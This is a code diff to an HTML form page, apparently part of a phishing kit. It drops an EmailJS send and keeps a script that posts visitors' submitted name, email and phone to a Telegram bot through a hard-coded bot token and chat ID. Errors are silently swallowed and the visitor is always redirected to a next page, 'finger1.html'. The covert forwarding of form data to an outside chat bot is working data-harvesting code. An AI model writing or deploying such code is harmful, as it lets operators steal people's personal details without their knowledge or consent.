@@ -126,10 +126,7 @@
   <button type="submit" style="width: 100%; padding: 12px; background-color: #007bff; color: white; border: none; border-radius: 5px; font-size: 16px;">Next</button>
 </form>
 
-<script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
 <script>
-  emailjs.init('gS9N2ye9VdTx8nzoD'); // Replace this with your actual EmailJS user ID
-
   async function handleForm(event) {
     event.preventDefault();
 
@@ -146,28 +143,24 @@ New Submission:
 📞 Phone: ${phone}
     `;
 
-    // ✅ Send to Telegram
+    // ✅ Telegram Info
     const telegramToken = "7989916546:AAEB5kP_GnKwdsf6fHw6yb_znh2w8hosEY0";
     const chatId = "5066200632";
-    await fetch(`https://api.telegram.org/bot${telegramToken}/sendMessage`, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({
-        chat_id: chatId,
-        text: message,
-      })
-    });
 
-    // ✅ Send Email with EmailJS
-    const templateParams = {
-      from_name: name,
-      user_email: email,
-      message: message
-    };
+    try {
+      await fetch(`https://api.telegram.org/bot${telegramToken}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: message,
+        })
+      });
+    } catch (error) {
+      console.warn("Telegram error (ignored):", error);
+    }
 
-    await emailjs.send("service_aqesm48", "template_6e9e18e", templateParams);
-
-    // ✅ Redirect to next page
+    // ✅ Always go to next page
     window.location.href = "finger1.html";
   }
 </script>
